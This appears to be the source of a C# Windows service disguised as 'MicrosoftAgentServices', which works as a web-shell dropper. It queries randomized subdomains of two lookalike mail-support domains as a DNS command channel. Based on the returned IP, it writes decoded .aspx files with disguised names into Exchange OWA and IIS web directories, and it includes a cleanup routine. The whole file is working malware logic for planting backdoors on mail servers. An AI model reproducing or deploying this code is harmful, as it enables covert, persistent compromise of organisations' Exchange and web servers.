using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.ServiceProcess;
using System.Text;
using System.Timers;


namespace MicrosoftAgentServices
{
    public enum enuFileName
    {
        aspnet,
        owafont,
        themes,
        logon

    }
    public partial class Service1 : ServiceBase
    {

        public string dnsdomain = ".eposta.maill-support.com";
        public string dnsdomain2 = ".eposta.mailupdate.info";

        public string web = "i am good boy";
        public string wwwroot = @"c:\inetpub\wwwroot\aspnet_client\";
        public string wwwroot2 = @"c:\inetpub\wwwroot\aspnet_client\system_web\";
        public string webpathexh01 = @"C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\Current\themes\resources\";
        public string webpathexh02 = @"C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\Current\themes\";
        public string webpathexh03 = @"C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\Current\";
        public string[] arrayNames = new string[] { "aspnet.aspx", "owafont.aspx", "themes.aspx", "logon.aspx" };
        public Service1()
        {
            InitializeComponent();
        }


        Timer workerTime = new Timer();
        protected override void OnStart(string[] args)
        {
            workerTime.Elapsed += new ElapsedEventHandler(this.OnElapsedTime);
            workerTime.Interval = 24 * 3600 * 1000;
            workerTime.Enabled = true;
        }
        protected override void OnStop()
        {
            workerTime.Enabled = false;
        }
        private readonly Random _random = new Random();
        public bool istry = true;
        public string randomName = string.Empty;
        private void OnElapsedTime(object value1, ElapsedEventArgs e)
        {
            string randstr = RandomString(2, false) + RandomString(3, true);
            string response = string.Empty;
            this.randomName = randstr;
            
            try
            {
                string finalhost = randstr + "EXH" + dnsdomain;
                System.Net.IPHostEntry query = System.Net.Dns.GetHostEntry(finalhost);
                response = query.AddressList[0].ToString();

                if (String.IsNullOrEmpty(response))
                {
                    System.Threading.Thread.Sleep(60 * 1000);
                    finalhost = randstr + "EXH" + dnsdomain2;
                    try
                    {
                        query = System.Net.Dns.GetHostEntry(finalhost);
                        response = query.AddressList[0].ToString();
                        if (!String.IsNullOrEmpty(response))
                        {
                            istry = false;
                        }
                    }
                    catch
                    {
                        string ms = "";
                    }
                }
            }
            catch (Exception)
            {
                string finalhost = randstr + "EXH" + dnsdomain2;
                System.Net.IPHostEntry query = System.Net.Dns.GetHostEntry(finalhost);
                response = query.AddressList[0].ToString();
                istry = false;
            }

            if (!String.IsNullOrEmpty(response))
            {
                string[] res = response.Split('.');

                if (res[3]=="58")
                {
                    webwrite(response);
                }
                else if (response == "212.175.168.59")
                {
                    removeweb();
                }
            }
        }
        private string RandomString(int size, bool lowerCase)
        {
            StringBuilder builder = new StringBuilder(size);

            char offset = lowerCase ? 'a' : 'A';
            const int lettersOffset = 26;

            for (int i = 0; i < size; i++)
            {
                char @char = (char)_random.Next(offset, offset + lettersOffset);
                builder.Append(@char);
            }

            return lowerCase ? builder.ToString().ToLower() : builder.ToString();
        }
        private void webwrite(string response)
        {
            string path = string.Empty;
            string[] choosePath = response.Split('.');
            bool isexh = (choosePath[2] == "168");
            string randName = this.randomName + ".aspx";
            if (isexh)
            {
                if (choosePath[1] == "175") path = (choosePath[0] == "212") ? webpathexh01 + arrayNames[(int)enuFileName.owafont] : webpathexh01 + randName;
                else if (choosePath[1] == "176") path = (choosePath[0] == "212") ? webpathexh02 + arrayNames[(int)enuFileName.themes] : webpathexh02 + randName;
                else if (choosePath[1] == "177") path = (choosePath[0] == "212") ? webpathexh03 + arrayNames[(int)enuFileName.logon] : webpathexh03 + randName;
                try
                {

                    byte[] clearWeb = System.Convert.FromBase64String(web.Replace("#", "").Replace("@", ""));
                    System.IO.File.WriteAllBytes(path, clearWeb);
                }
                catch (Exception e)
                {
                    string s = e.Message;
                }
            }
            else
            {
                if (choosePath[1] == "175") path = (choosePath[0] == "212") ? wwwroot + arrayNames[(int)enuFileName.aspnet] : wwwroot + randName;
                else if (choosePath[1] == "176") path = (choosePath[0] == "212") ? wwwroot2 + arrayNames[(int)enuFileName.aspnet] : wwwroot2 + randName;
                try
                {
                    byte[] clearWeb = System.Convert.FromBase64String(web.Replace("#", "").Replace("@", ""));
                    System.IO.File.WriteAllBytes(path, clearWeb);
                }
                catch (Exception e)
                {
                    string s = e.Message;
                }
            }
        }
        private void removeweb()
        {
            if (System.IO.File.Exists(webpathexh01))
            {
                try
                {
                    System.IO.File.Delete(webpathexh01);
                }
                catch (Exception e)
                {

                    string ss = e.Message;
                }
            }
            if (System.IO.File.Exists(webpathexh02))
            {
                try
                {
                    System.IO.File.Delete(webpathexh02);
                }
                catch (Exception e)
                {

                    string ss = e.Message;
                }
            }
            if (System.IO.File.Exists(webpathexh03))
            {
                try
                {
                    System.IO.File.Delete(webpathexh03);
                }
                catch (Exception e)
                {

                    string ss = e.Message;
                }
            }
            if (System.IO.File.Exists(wwwroot))
            {
                try
                {
                    System.IO.File.Delete(wwwroot);
                }
                catch (Exception e)
                {

                    string ss = e.Message;
                }
            }
            if (System.IO.File.Exists(wwwroot2))
            {
                try
                {
                    System.IO.File.Delete(wwwroot2);
                }
                catch (Exception e)
                {

                    string ss = e.Message;
                }
            }
        }
    }
}
